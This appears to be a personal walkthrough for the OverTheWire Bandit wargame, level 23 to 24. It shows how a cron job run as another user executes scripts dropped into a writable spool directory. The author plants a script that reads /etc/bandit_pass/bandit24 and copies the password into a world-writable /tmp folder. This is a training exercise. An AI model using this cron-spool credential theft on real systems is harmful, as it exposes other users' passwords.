basically, i was stuck at this level.

So, i learned how to do it.

1. create a temporary directory where we will be storing the copy of our script

```shell
mkdir /tmp/lvl24
```

to avoid "permission denied" errors and getting frustated like me at the end about what went wrong, change the permissions of the newly created directory

```shell
chmod 777 /tmp/lvl24
```

> coming to the script...lets look at this file in /etc/cron.d

```shell
bandit23@bandit:/etc/cron.d$ cat * 2>/dev/null | grep bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ ls -lha /usr/bin/cronjob_bandit24.sh
-rwxr-x--- 1 bandit24 bandit23 395 Apr 23 18:06 /usr/bin/cronjob_bandit24.sh
bandit23@bandit:/etc/cron.d$ 
```
by reading the contents of the above file you will come across a script, where in you find that all the files in a certain directory whose owner is bandi23 are being executed and deleted periodically, and bandit24 user executes that file

so what we can do is that, write a script that can read the pass file for level 24 which is stored in /etc/bandit_pass/
bandi24 to the newly created directory

contents of the script file

```bash
#! /bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/lvl24/pass.txt

```


>make the script executable

```shell
chmod 777 script.sh
```

we need to put this in the directory that is mentioned in the script
>/usr/bin/cronjob_bandit24.sh

```bash
cp /tmp/lvl24/script.sh /var/spool/bandit24/foo
```
after a min, you will see pass.txt in your newly created directory which contains the pass to next level